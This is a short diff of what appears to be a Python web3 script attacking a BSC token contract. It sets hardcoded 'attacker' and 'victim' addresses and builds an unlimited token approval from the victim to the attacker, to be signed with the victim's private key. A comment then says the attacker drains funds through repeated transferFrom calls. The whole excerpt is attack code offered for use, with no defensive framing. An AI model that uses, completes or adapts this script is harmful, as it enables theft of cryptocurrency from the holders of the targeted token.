@@ -6,8 +6,8 @@ w3 = Web3(Web3.HTTPProvider("https://bsc-dataseed.binance.org"))
 
 
 # Addresses
-attacker = 0x9701b5f824873560ad5670De0891D8D80F998eBa  # replace with your attacker address
-victim = 0xDA5eEeF71CE9892b79b0215E771153f84930A653    # replace with victim (has tokens)
+attacker = "0x9701b5f824873560ad5670De0891D8D80F998eBa"  # replace with your attacker address
+victim = "0xDA5eEeF71CE9892b79b0215E771153f84930A653"    # replace with victim (has tokens)
 
 # Set contract address and ABI
 contract_address = "0xc461CE1893895ea6eA3dacFe03dbd14120BFf8ba"
@@ -24,6 +24,7 @@ tx1 = token.functions.approve(attacker, 2**256 - 1).build_transaction({
     "gas": 200000,
     "gasPrice": w3.to_wei("5", "gwei")
 })
+
 # Sign and send with victim's private key
 
 # Step 2: Attacker drains funds via transferFrom repeatedly
